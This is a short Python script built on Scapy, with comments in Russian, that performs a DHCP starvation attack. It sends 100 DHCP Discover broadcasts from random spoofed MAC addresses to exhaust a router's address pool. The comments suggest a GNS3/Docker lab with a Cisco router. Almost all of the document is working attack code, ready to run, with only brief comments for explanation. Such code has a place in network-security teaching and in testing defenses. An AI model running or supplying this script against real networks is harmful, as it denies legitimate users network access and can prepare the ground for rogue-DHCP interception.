from scapy.all import *
import time

# Отключаем проверку IP в Scapy (так как шлем пакеты от 0.0.0.0)
conf.checkIPaddr = False

print("[*] Начинаем атаку DHCP Starvation (Истощение пула)...")

# Генерируем 100 поддельных запросов (хватит, чтобы положить пул из 50 адресов)
for i in range(100):
    # 1. Генерируем случайный MAC-адрес
    fake_mac = RandMAC()
    
    # 2. Собираем L2 (Ethernet - Broadcast) и L3 (IP) слои
    ethernet = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff")
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    
    # 3. Собираем L4 (UDP порты DHCP: клиент 68, сервер 67)
    udp = UDP(sport=68, dport=67)
    
    # 4. Формируем протокол BOOTP/DHCP (Discover)
    bootp = BOOTP(chaddr=mac2str(fake_mac))
    dhcp = DHCP(options=[("message-type", "discover"), "end"])
    
    # 5. Склеиваем пакет
    packet = ethernet / ip / udp / bootp / dhcp
    
    # 6. Отправляем в сеть на L2 (sendp). iface="eth0" для Docker в GNS3
    sendp(packet, iface="eth0", verbose=False)
    
    print(f"[+] Отправлен DHCP Discover от поддельного MAC: {fake_mac}")
    time.sleep(0.05) # Крошечная пауза, чтобы база данных Cisco не залочилась намертво сразу

print("[!] Атака завершена! Проверьте пул DHCP на роутере командой 'show ip dhcp binding'.")